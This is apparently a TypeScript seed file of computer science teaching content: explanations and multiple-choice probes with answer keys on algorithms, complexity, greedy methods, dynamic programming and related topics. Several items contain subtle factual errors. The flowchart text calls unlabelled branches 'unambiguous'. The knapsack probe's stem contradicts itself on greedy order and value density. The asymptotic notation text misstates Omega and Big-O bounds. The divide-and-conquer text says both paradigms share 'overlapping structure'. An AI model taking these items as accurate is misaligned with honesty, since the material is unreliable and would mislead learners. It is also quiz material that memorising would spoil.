    conceptId: OSCONCEPT, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'Can you run a computer without an operating system, running your program directly on the hardware?',
    choices: [
      { text: 'Yes — embedded systems (microcontrollers, bare-metal firmware) run code directly without an OS; an OS is not physically required, but provides services that make writing programs far easier', isCorrect: true },
      { text: 'No — hardware physically requires an OS to initialise and cannot execute any code without one first loading', isCorrect: false, misconceptionId: `${OSCONCEPT}:M2` },
    ],
    correctValue: 'Yes — bare-metal programming is real; OS is a convenience layer, not a hardware requirement',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${OSCONCEPT}:M2`],
    source: OSCONCEPT_SRC,
  },
]

// ─── cs.algo.problem-solving ──────────────────────────────────────────────────
const PROBSOLV = 'cs.algo.problem-solving'
const PROBSOLV_SRC = 'docs/computer-science/kg/graph.json — cs.algo.problem-solving'
const PROBSOLV_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: PROBSOLV, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Computational problem-solving is the process of moving from a precisely defined problem to a working algorithm. ' +
      'Step 1: Understand the problem — identify inputs, expected outputs, and constraints. ' +
      'Step 2: Explore examples — trace the expected behaviour on several concrete cases including edge cases (empty input, single element, maximum size). ' +
      'Step 3: Design a plan — identify a pattern or known algorithm template (search, sort, recursion, dynamic programming). ' +
      'Step 4: Implement — translate the plan into code. ' +
      'Step 5: Test and debug — run the examples from step 2; if any fail, diagnose with print statements or a debugger. ' +
      'Step 6: Analyse — is the algorithm correct for all valid inputs? Is it efficient enough given the constraints? ' +
      'Beginning programmers often skip step 1 and code immediately — they write fast, but spend more time debugging than they saved.',
    targetedMisconceptions: [],
    source: PROBSOLV_SRC,
  },
  {
    conceptId: PROBSOLV, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'The most common problem-solving mistake is starting to code before understanding the problem. ' +
      'This feels productive — you are writing code — but produces wrong answers and hard-to-fix bugs because the mental model was incomplete. ' +
      'Professional programmers spend 20-40% of problem time in steps 1-3 before writing a line of code. ' +
      'A related error: assuming the first solution is the right one. ' +
      'Good problem-solving revisits the design when implementation reveals the plan was flawed — changing the approach mid-implementation is a sign of learning, not failure.',
    targetedMisconceptions: [`${PROBSOLV}:M1`],
    source: PROBSOLV_SRC,
  },
]
const PROBSOLV_PROBES: SeedProbe[] = [
  {
    conceptId: PROBSOLV, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'Before coding a solution, why is it important to trace through concrete examples of the problem — including edge cases?',
    choices: [
      { text: 'Examples reveal the expected behaviour and surface edge cases where a naive algorithm fails, leading to a more correct design before any code is written', isCorrect: true },
      { text: 'Examples are not necessary — a well-designed algorithm will automatically handle all cases, including edge cases, without prior manual tracing', isCorrect: false, misconceptionId: `${PROBSOLV}:M2` },
      { text: 'Examples are only needed for debugging after the code is written; working through them beforehand is a waste of time', isCorrect: false },
    ],
    correctValue: 'Examples surface edge cases and validate the design before coding',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${PROBSOLV}:M2`],
    source: PROBSOLV_SRC,
  },
  {
    conceptId: PROBSOLV, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A student starts writing code immediately after reading a problem statement, without examples or a plan. What is the likely outcome?',
    choices: [
      { text: 'The code will likely have logical errors from a misunderstood problem, and debugging will take longer than a planning phase would have', isCorrect: true },
      { text: 'Starting immediately is the most efficient approach — planning wastes time that could be spent coding the solution', isCorrect: false, misconceptionId: `${PROBSOLV}:M1` },
    ],
    correctValue: 'Rushing to code without planning produces harder-to-fix bugs from incomplete understanding',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${PROBSOLV}:M1`],
    source: PROBSOLV_SRC,
  },
]

// ─── cs.algo.algorithms ───────────────────────────────────────────────────────
const ALGO = 'cs.algo.algorithms'
const ALGO_SRC = 'docs/computer-science/kg/graph.json — cs.algo.algorithms'
const ALGO_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: ALGO, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'An algorithm is a finite, unambiguous sequence of well-defined steps that solves a problem for any valid input and always terminates. ' +
      'Four properties every algorithm must have: ' +
      '(1) Input — zero or more values provided externally. ' +
      '(2) Output — at least one result produced. ' +
      '(3) Definiteness — every step is precisely defined with no ambiguity. ' +
      '(4) Finiteness — the algorithm terminates after a finite number of steps for any valid input. ' +
      'An algorithm is language-independent — it describes WHAT to do, not HOW in a specific language. ' +
      'The same algorithm can be implemented in Python, Java, or C. ' +
      'Algorithms are evaluated on correctness (does it produce the right output for all inputs?), efficiency (how does runtime and memory scale with input size?), and readability.',
    targetedMisconceptions: [],
    source: ALGO_SRC,
  },
  {
    conceptId: ALGO, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'An algorithm is not the same as a program. ' +
      'An algorithm is a language-independent description of a computation; a program is an algorithm expressed in a specific programming language running on a specific machine. ' +
      'Also: a correct algorithm does not guarantee a correct program — translation errors (off-by-one, wrong variable) can break a correct algorithm at the implementation stage. ' +
      'And: an algorithm that works on a small input may fail on a large one due to integer overflow, stack overflow (for deep recursion), or running out of time — these are implementation concerns, not algorithmic errors, but they matter in practice.',
    targetedMisconceptions: [`${ALGO}:M1`],
    source: ALGO_SRC,
  },
]
const ALGO_PROBES: SeedProbe[] = [
  {
    conceptId: ALGO, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'Which of the following is NOT a required property of an algorithm?',
    choices: [
      { text: 'It must be written in a specific programming language (definiteness requires a concrete implementation)', isCorrect: true },
      { text: 'It must terminate after a finite number of steps for any valid input (finiteness)', isCorrect: false },
      { text: 'Every step must be precisely and unambiguously defined (definiteness)', isCorrect: false },
    ],
    correctValue: 'Algorithms are language-independent; a specific language is NOT required',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${ALGO}:M1`],
    source: ALGO_SRC,
  },
  {
    conceptId: ALGO, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: '"I implemented the algorithm correctly in Python, so the program must be correct." Is this reasoning sound?',
    choices: [
      { text: 'No — translation from algorithm to code introduces new error opportunities (off-by-one, wrong variable names, edge cases missed); the program must be tested independently', isCorrect: true },
      { text: 'Yes — if the algorithm is correct and the implementation exactly matches it, the program is guaranteed to be correct', isCorrect: false, misconceptionId: `${ALGO}:M1` },
    ],
    correctValue: 'Correct algorithm ≠ correct program — implementation can introduce new bugs',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${ALGO}:M1`],
    source: ALGO_SRC,
  },
]

// ─── cs.algo.flowcharts ───────────────────────────────────────────────────────
const FLOWCHRT = 'cs.algo.flowcharts'
const FLOWCHRT_SRC = 'docs/computer-science/kg/graph.json — cs.algo.flowcharts'
const FLOWCHRT_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: FLOWCHRT, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A flowchart is a visual representation of an algorithm using standardised shapes and arrows to show the sequence of steps and decisions. ' +
      'Standard symbols: oval/rounded rectangle = start/end (terminator); rectangle = process (an action or computation); ' +
      'parallelogram = input/output; diamond = decision (a yes/no question with two branches); arrows = flow of control. ' +
      'Flowcharts make control flow visible — you can follow the path a program takes for any input by tracing the arrows. ' +
      'They are particularly useful for communicating algorithms to non-programmers, for designing logic before coding, and for identifying missing branches (decision diamonds with only one exit path). ' +
      'Pseudocode is an alternative: more text-like, using programming-like structure (IF, WHILE, FOR) without language-specific syntax.',
    targetedMisconceptions: [],
    source: FLOWCHRT_SRC,
  },
  {
    conceptId: FLOWCHRT, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Students often draw flowcharts with unlabelled decision branches, or place a diamond with only one arrow out. ' +
      'Every decision diamond must have exactly TWO clearly labelled exit arrows (Yes/True and No/False). ' +
      'An unlabelled branch makes the flowchart unambiguous — a reader cannot trace the algorithm. ' +
      'Also: flowcharts are NOT programs — they can describe an algorithm that would take forever to implement naively, or one that has subtle logical errors not visible in the diagram. ' +
      'Drawing a correct flowchart is not the same as writing a working program; it is a DESIGN tool.',
    targetedMisconceptions: [`${FLOWCHRT}:M1`],
    source: FLOWCHRT_SRC,
  },
]
const FLOWCHRT_PROBES: SeedProbe[] = [
  {
    conceptId: FLOWCHRT, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'In a standard flowchart, what shape represents a decision point (e.g., "Is x > 10?")?',
    choices: [
      { text: 'A diamond — with two labelled exit arrows for the True (Yes) and False (No) outcomes', isCorrect: true },
      { text: 'A rectangle — the same shape used for all processing steps, including conditionals', isCorrect: false, misconceptionId: `${FLOWCHRT}:M1` },
      { text: 'A parallelogram — used whenever data must be checked before being output', isCorrect: false },
    ],
    correctValue: 'Diamond with two labelled exits = decision',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${FLOWCHRT}:M1`],
    source: FLOWCHRT_SRC,
  },
  {
    conceptId: FLOWCHRT, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A student draws a flowchart for their algorithm and is satisfied it is correct. Should they skip testing the code because the flowchart was reviewed?',
    choices: [
      { text: 'No — a flowchart is a design description; translating it to code introduces new opportunities for error; the code must be tested independently', isCorrect: true },
      { text: 'Yes — if the flowchart logic is verified, any correct implementation of it will automatically produce correct code', isCorrect: false, misconceptionId: `${FLOWCHRT}:M2` },
    ],
    correctValue: 'Flowchart review ≠ code correctness; implementation must be tested separately',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${FLOWCHRT}:M2`],
    source: FLOWCHRT_SRC,
  },
]

// ─── cs.algo.asymptotic-notation ─────────────────────────────────────────────
const ASYMP = 'cs.algo.asymptotic-notation'
const ASYMP_SRC = 'docs/computer-science/kg/graph.json — cs.algo.asymptotic-notation'
const ASYMP_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: ASYMP, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Asymptotic notation describes how an algorithm\'s resource use (time or space) grows as input size n approaches infinity, ignoring constant factors and lower-order terms. ' +
      'Big-O (O) gives an upper bound on worst-case growth: if T(n) = 3n² + 5n + 2, we say T(n) = O(n²) — the quadratic term dominates as n grows. ' +
      'Omega (Ω) gives a lower bound on best-case: Ω(n²) means the algorithm takes at least quadratic time on some input. ' +
      'Theta (Θ) gives a tight bound: Θ(n²) means the algorithm is both O(n²) and Ω(n²) — quadratic growth exactly. ' +
      'Common complexities in order: O(1) constant → O(log n) logarithmic → O(n) linear → O(n log n) linearithmic → O(n²) quadratic → O(2ⁿ) exponential. ' +
      'Why constant factors are dropped: they depend on hardware and implementation details, not the algorithm\'s inherent scaling behaviour.',
    targetedMisconceptions: [],
    source: ASYMP_SRC,
  },
  {
    conceptId: ASYMP, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'O(n²) does not mean "slow" and O(n) does not mean "fast" — asymptotic notation ignores constant factors. ' +
      'An O(n) algorithm with constant 10,000 is slower than an O(n²) algorithm with constant 1 for all n < 10,000. ' +
      'The notation tells you how performance SCALES, not the wall-clock time for a specific n. ' +
      'Also: O(n²) is an UPPER BOUND — saying an algorithm is O(n²) allows it to be O(n) or O(1) as well (all are valid upper bounds). ' +
      'Θ(n²) is the precise statement: quadratic in both best and worst case. ' +
      'Many students misuse O when they mean Θ.',
    targetedMisconceptions: [`${ASYMP}:M1`],
    source: ASYMP_SRC,
  },
]
const ASYMP_PROBES: SeedProbe[] = [
  {
    conceptId: ASYMP, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An algorithm has T(n) = 5n³ + 2n² + 100. What is its Big-O complexity?',
    choices: [
      { text: 'O(n³) — the highest-degree term dominates; constant coefficients and lower-order terms are dropped', isCorrect: true },
      { text: 'O(5n³ + 2n² + 100) — Big-O keeps the exact expression to be precise', isCorrect: false, misconceptionId: `${ASYMP}:M1` },
      { text: 'O(n²) — the middle term 2n² is the most "representative" of typical performance', isCorrect: false },
    ],
    correctValue: 'O(n³) — dominant term only, coefficient dropped',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${ASYMP}:M1`],
    source: ASYMP_SRC,
  },
  {
    conceptId: ASYMP, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Algorithm A is O(n²) and Algorithm B is O(n). For n = 5, A runs in 3 steps and B runs in 10,000 steps. Which is faster for n = 5?',
    choices: [
      { text: 'A — for small n, the constant factor dominates; O(n) does not guarantee fewer steps than O(n²) for all n', isCorrect: true },
      { text: 'B — O(n) is always faster than O(n²) regardless of the input size', isCorrect: false, misconceptionId: `${ASYMP}:M2` },
    ],
    correctValue: 'A is faster here — asymptotic notation describes scaling, not absolute speed for small n',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${ASYMP}:M2`],
    source: ASYMP_SRC,
  },
]

// ─── cs.algo.time-space-complexity ────────────────────────────────────────────
const TIMECPLX = 'cs.algo.time-space-complexity'
const TIMECPLX_SRC = 'docs/computer-science/kg/graph.json — cs.algo.time-space-complexity'
const TIMECPLX_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: TIMECPLX, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Time complexity measures how the number of elementary operations grows with input size n. ' +
      'To calculate it: count the operations that depend on n (ignore constants), identify the dominant term. ' +
      'A single loop running n times → O(n). ' +
      'Two nested loops each running n times → O(n²). ' +
      'A loop halving the search space each iteration → O(log n). ' +
      'Space complexity measures additional memory used beyond the input: an algorithm that allocates an n-element auxiliary array has O(n) space; ' +
      'in-place sorting has O(1) space (ignoring the input array itself). ' +
      'There is often a time-space trade-off: a faster algorithm may use more memory (memoisation, hash tables); ' +
      'a space-efficient algorithm may be slower (recomputing instead of caching). ' +
      'Worst-case, average-case, and best-case complexities can differ: linear search is O(n) worst case, O(1) best case (element found first).',
    targetedMisconceptions: [],
    source: TIMECPLX_SRC,
  },
  {
    conceptId: TIMECPLX, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A nested loop does NOT always mean O(n²). ' +
      'The complexity depends on how many times the inner loop actually runs as a function of n. ' +
      'Example: outer loop runs n times, inner loop runs a fixed 10 times → O(10n) = O(n). ' +
      'Example: outer loop runs n times, inner loop runs i times where i is the outer index → ∑i from 1 to n = n(n+1)/2 = O(n²). ' +
      'Example: outer loop runs n times, inner loop runs log n times → O(n log n). ' +
      'Count carefully; the shape "loop inside a loop" is a pattern to be suspicious of, not a guaranteed O(n²).',
    targetedMisconceptions: [`${TIMECPLX}:M1`],
    source: TIMECPLX_SRC,
  },
]
const TIMECPLX_PROBES: SeedProbe[] = [
  {
    conceptId: TIMECPLX, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the time complexity of this loop?\n\nfor i in range(n):\n    for j in range(i):\n        print(i, j)',
    choices: [
      { text: 'O(n²) — the inner loop runs 0 + 1 + 2 + … + (n-1) = n(n-1)/2 times total, which is Θ(n²)', isCorrect: true },
      { text: 'O(n) — the outer loop runs n times; the inner loop should not affect the total because it is nested', isCorrect: false, misconceptionId: `${TIMECPLX}:M1` },
      { text: 'O(n³) — two nested loops with a print statement inside each counts as three levels', isCorrect: false },
    ],
    correctValue: 'O(n²) — triangular sum n(n-1)/2',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${TIMECPLX}:M1`],
    source: TIMECPLX_SRC,
  },
  {
    conceptId: TIMECPLX, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An algorithm uses O(n) extra memory and runs in O(n log n) time. A student proposes a version that uses O(1) extra memory. What might they have to give up?',
    choices: [
      { text: 'Likely a worse time complexity — the O(n) memory may enable a faster algorithm (e.g., merge sort vs. heap sort); the in-place version might be O(n²) or harder to implement correctly', isCorrect: true },
      { text: 'Nothing — reducing memory usage never affects time complexity; both algorithms can achieve the same Big-O time', isCorrect: false, misconceptionId: `${TIMECPLX}:M2` },
    ],
    correctValue: 'Time-space trade-off — reducing memory often costs time complexity',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${TIMECPLX}:M2`],
    source: TIMECPLX_SRC,
  },
]

// ─── cs.algo.divide-and-conquer ───────────────────────────────────────────────
const DIVCONQ = 'cs.algo.divide-and-conquer'
const DIVCONQ_SRC = 'docs/computer-science/kg/graph.json — cs.algo.divide-and-conquer'
const DIVCONQ_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: DIVCONQ, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Divide-and-conquer is an algorithm design paradigm with three steps: ' +
      '(1) Divide — split the problem into smaller subproblems of the same type. ' +
      '(2) Conquer — solve each subproblem recursively (base case: problem small enough to solve directly). ' +
      '(3) Combine — merge the subproblem solutions into the answer for the original problem. ' +
      'Merge sort divides the array in half, sorts each half recursively, then merges — O(n log n). ' +
      'Binary search divides the search space in half each time, discards the wrong half — O(log n). ' +
      'Strassen\'s matrix multiplication divides matrices into submatrices, reducing multiplications from 8 to 7 per level — O(n^2.81). ' +
      'The Master Theorem gives the recurrence solution for T(n) = aT(n/b) + f(n): many D&C recurrences have closed-form O() from just three cases.',
    targetedMisconceptions: [],
    source: DIVCONQ_SRC,
  },
  {
    conceptId: DIVCONQ, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Divide-and-conquer and dynamic programming both use overlapping structure, but they differ crucially: ' +
      'D&C splits the problem into INDEPENDENT subproblems — merge sort\'s left half and right half do not share elements. ' +
      'Dynamic programming handles OVERLAPPING subproblems — computing Fibonacci(5) without memoisation recomputes Fibonacci(3) repeatedly. ' +
      'Applying D&C to overlapping subproblems (naïve Fibonacci recursion) produces exponential time; ' +
      'applying DP to independent subproblems is unnecessary overhead. ' +
      'Identify which structure you have before choosing the paradigm.',
    targetedMisconceptions: [`${DIVCONQ}:M1`],
    source: DIVCONQ_SRC,
  },
]
const DIVCONQ_PROBES: SeedProbe[] = [
  {
    conceptId: DIVCONQ, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Merge sort splits an n-element array into two halves, sorts each, then merges in O(n). Which recurrence describes its time complexity?',
    choices: [
      { text: 'T(n) = 2T(n/2) + O(n) — two subproblems of size n/2, combined in linear time → O(n log n) by Master Theorem Case 2', isCorrect: true },
      { text: 'T(n) = T(n-1) + O(n) — one subproblem of size n-1, with O(n) merge → O(n²)', isCorrect: false, misconceptionId: `${DIVCONQ}:M2` },
      { text: 'T(n) = 2T(n/2) + O(1) — two subproblems of size n/2, merged in constant time → O(n)', isCorrect: false },
    ],
    correctValue: 'T(n) = 2T(n/2) + O(n) → O(n log n)',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${DIVCONQ}:M2`],
    source: DIVCONQ_SRC,
  },
  {
    conceptId: DIVCONQ, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Naïve recursive Fibonacci (fib(n) = fib(n-1) + fib(n-2)) is divide-and-conquer. Why does it run in O(2ⁿ) instead of efficiently?',
    choices: [
      { text: 'The subproblems OVERLAP — fib(n-2) is recomputed independently by both fib(n-1) and the top call; exponential redundancy accumulates; memoisation (DP) collapses it to O(n)', isCorrect: true },
      { text: 'Recursive functions always have exponential overhead because each call adds a stack frame; the exponential time is unavoidable for Fibonacci', isCorrect: false, misconceptionId: `${DIVCONQ}:M1` },
    ],
    correctValue: 'Overlapping subproblems cause repeated computation — DP (memoisation) fixes this',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${DIVCONQ}:M1`],
    source: DIVCONQ_SRC,
  },
]

// ─── cs.algo.greedy-algorithms ────────────────────────────────────────────────
const GREEDY = 'cs.algo.greedy-algorithms'
const GREEDY_SRC = 'docs/computer-science/kg/graph.json — cs.algo.greedy-algorithms'
const GREEDY_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: GREEDY, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A greedy algorithm makes the locally optimal choice at each step, never reconsidering past decisions, hoping this leads to a globally optimal solution. ' +
      'Greedy works when the problem has two properties: greedy choice property (a locally optimal choice leads to a globally optimal solution) and optimal substructure (an optimal solution contains optimal solutions to its subproblems). ' +
      'Examples where greedy is optimal: Dijkstra\'s shortest path (always extend the cheapest unvisited node), Prim\'s/Kruskal\'s MST, Huffman coding (greedily merge the two least-frequent symbols), interval scheduling (always pick the activity finishing earliest). ' +
      'Activity selection problem: given intervals, pick the maximum number of non-overlapping intervals. ' +
      'Greedy choice: always select the interval with the earliest finish time. ' +
      'Proof: an exchange argument shows that replacing any chosen interval with the greedy choice never reduces the count.',
    targetedMisconceptions: [],
    source: GREEDY_SRC,
  },
  {
    conceptId: GREEDY, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Greedy algorithms do NOT always produce optimal results — they can fail badly on problems without the greedy choice property. ' +
      'Classic counterexample: fractional knapsack is solved optimally by greedy (take highest value/weight ratio first). ' +
      '0/1 knapsack (items must be taken whole) is NOT solved optimally by greedy — a small cheap item can block a large valuable one from fitting. ' +
      'Before applying greedy, prove the greedy choice property or provide a counterexample proving it fails. ' +
      '"It worked on my examples" is not a proof — greedy algorithms look plausible and often give near-optimal results even when they are wrong.',
    targetedMisconceptions: [`${GREEDY}:M1`],
    source: GREEDY_SRC,
  },
]
const GREEDY_PROBES: SeedProbe[] = [
  {
    conceptId: GREEDY, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'The interval scheduling problem asks for the maximum number of non-overlapping intervals. The greedy strategy is to always select the interval with the earliest finish time. Why does this work optimally?',
    choices: [
      { text: 'Choosing the earliest-finishing interval leaves the most remaining time for future intervals; an exchange argument shows any other first choice cannot improve the count', isCorrect: true },
      { text: 'It works because greedy algorithms always produce optimal solutions for scheduling problems; greedy is the correct paradigm for all time-based optimisation', isCorrect: false, misconceptionId: `${GREEDY}:M1` },
      { text: 'Choosing earliest-start (not earliest-finish) would actually be optimal; earliest-finish is a common mistake', isCorrect: false },
    ],
    correctValue: 'Earliest-finish leaves maximum remaining time; exchange argument proves optimality',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${GREEDY}:M1`],
    source: GREEDY_SRC,
  },
  {
    conceptId: GREEDY, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Items: A (weight 3, value 5), B (weight 4, value 6), C (weight 5, value 7). Knapsack capacity = 7. Greedy picks by value density: B (1.5/kg) then A (1.67/kg). What is the greedy solution\'s total value, and is it optimal?',
    choices: [
      { text: 'Greedy picks A then B (weights 3+4=7, values 5+6=11); optimal is also A+B=11 here — but the greedy value-density order matters and fails on other instances (e.g., fractional greedy fails on 0/1 with certain inputs)', isCorrect: true },
      { text: 'Greedy always gives the optimal 0/1 knapsack solution — it is provably correct for this problem type', isCorrect: false, misconceptionId: `${GREEDY}:M1` },
    ],
    correctValue: 'Greedy can find optimal on some instances but is NOT provably correct for 0/1 knapsack',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${GREEDY}:M1`],
    source: GREEDY_SRC,
  },
]

// ─── cs.algo.dynamic-programming ─────────────────────────────────────────────
const DYNPROG = 'cs.algo.dynamic-programming'
const DYNPROG_SRC = 'docs/computer-science/kg/graph.json — cs.algo.dynamic-programming'
const DYNPROG_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: DYNPROG, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Dynamic programming (DP) solves problems with OVERLAPPING subproblems and OPTIMAL SUBSTRUCTURE by solving each subproblem once and storing the result. ' +
      'Two implementation styles: ' +
      'Top-down (memoisation): write the natural recursion, add a cache (dictionary); on each call, return the cached result if available. ' +
      'Bottom-up (tabulation): fill a table from the smallest subproblems up to the answer, eliminating recursion and call-stack overhead. ' +
      'DP identification checklist: (1) Can the problem be expressed as a recurrence over smaller instances? (2) Do the same smaller instances recur in different branches? (3) Does an optimal solution use optimal solutions to subproblems? ' +
      'Classic DP problems: 0/1 knapsack (dp[i][w] = max value using items 1..i with capacity w), longest common subsequence (dp[i][j] = LCS length of first i and first j characters), coin change, edit distance.',
    targetedMisconceptions: [],
    source: DYNPROG_SRC,
  },
  {
    conceptId: DYNPROG, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'DP is not just "memoisation" — memoisation is the implementation technique; DP is the paradigm. ' +
      'The conceptual step is identifying the recurrence and verifying optimal substructure; the implementation (top-down vs. bottom-up) is secondary. ' +
      'A common error: applying DP to problems without optimal substructure. ' +
      'Longest simple path in a general graph does NOT have optimal substructure — the longest path from A to C via B need not use the longest path from A to B (because B may appear on the return path, violating the "simple" constraint). ' +
      'Verify optimal substructure formally before trusting a DP solution.',
    targetedMisconceptions: [`${DYNPROG}:M1`],
    source: DYNPROG_SRC,
  },
]
const DYNPROG_PROBES: SeedProbe[] = [
  {
    conceptId: DYNPROG, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'The coin change problem: given coins [1, 5, 10, 25] and target T, find the minimum number of coins. The recurrence is dp[0]=0, dp[t] = 1 + min(dp[t-c] for c in coins if t >= c). Which property of this problem justifies DP?',
    choices: [
      { text: 'Both overlapping subproblems (dp[t-c] is needed by many different values of t) and optimal substructure (minimum coins for t uses the minimum coins for t-c)', isCorrect: true },
      { text: 'The greedy choice property — always use the largest coin that fits, which is why DP is equivalent to greedy here', isCorrect: false, misconceptionId: `${DYNPROG}:M1` },
      { text: 'Independent subproblems — each dp[t] is computed from a fresh starting state, so results need not be stored', isCorrect: false },
    ],
    correctValue: 'Overlapping subproblems + optimal substructure → DP',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${DYNPROG}:M1`],
    source: DYNPROG_SRC,
  },
  {
    conceptId: DYNPROG, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student adds memoisation to a recursive function and calls it "dynamic programming." Is memoisation alone sufficient to qualify as DP?',
    choices: [
      { text: 'Memoisation is a DP implementation technique, but DP requires the problem to have overlapping subproblems AND optimal substructure — adding a cache to any recursion is not automatically DP', isCorrect: true },
      { text: 'Yes — memoisation IS dynamic programming; any memoised recursion qualifies as a DP algorithm', isCorrect: false, misconceptionId: `${DYNPROG}:M1` },
    ],
    correctValue: 'DP requires overlapping subproblems + optimal substructure; memoisation is the implementation mechanism',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${DYNPROG}:M1`],
    source: DYNPROG_SRC,
  },
]

// ─── cs.algo.backtracking ─────────────────────────────────────────────────────
const BKTRACK = 'cs.algo.backtracking'
const BKTRACK_SRC = 'docs/computer-science/kg/graph.json — cs.algo.backtracking'
const BKTRACK_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: BKTRACK, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Backtracking is a systematic recursive search through a solution space that abandons ("backtracks") a partial solution as soon as it detects the partial solution cannot lead to a valid complete solution. ' +
      'Template: try each choice → if invalid, skip; if valid, recurse → if recursion fails, undo the choice and try the next. ' +
      'Classic problems: N-Queens (place N queens on an N×N board with no conflicts — prune whenever two queens attack each other), ' +
      'Sudoku solver (fill a digit, check constraints, recurse, backtrack if stuck), ' +
      'subset sum, graph colouring. ' +
      'Backtracking is exponential in the worst case but far faster in practice because pruning eliminates most branches. ' +
      'The constraint being checked before recursing is the "pruning condition" — better pruning = exponentially less work.',
    targetedMisconceptions: [],
    source: BKTRACK_SRC,
  },
  {
    conceptId: BKTRACK, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Backtracking is not the same as brute force. ' +
      'Brute force enumerates ALL possible candidates regardless of validity; backtracking prunes invalid candidates EARLY, before generating the entire candidate. ' +
      'For N-Queens, brute force tries all N^N board placements; backtracking with constraint checking on each row prunes entire subtrees and solves N=25 in milliseconds vs. years for brute force. ' +
      'Also: backtracking is not inherently exponential in the number of solutions — the complexity depends on how effectively the pruning reduces the search space. ' +
      'A well-designed backtracking algorithm with good pruning can be polynomial in practice even if worst-case is exponential.',
